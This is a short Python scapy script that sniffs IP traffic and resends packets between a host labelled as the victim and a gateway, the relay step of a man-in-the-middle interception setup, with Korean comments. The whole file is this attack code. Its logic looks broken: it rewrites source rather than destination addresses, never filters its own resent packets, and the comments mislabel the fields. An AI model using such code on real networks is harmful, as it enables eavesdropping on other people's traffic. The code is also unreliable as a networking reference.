from scapy.all import *

def packet_relay(packet):
    if IP in packet:
        if packet[IP].src == "192.168.2.131":  # 출발지 IP 주소
            packet[IP].src = "192.168.2.2"  # 목적지 IP 주소
            print("relaying...from vic to gateway...")
        elif packet[IP].src == "192.168.2.2":  # 출발지 IP 주소
            packet[IP].src = "192.168.2.131"  # 목적지 IP 주소
            print("relaying...from gateway to vic")
        send(packet)
        print("relaying...senddone")
       

sniff(filter="ip", prn=packet_relay, store=0)
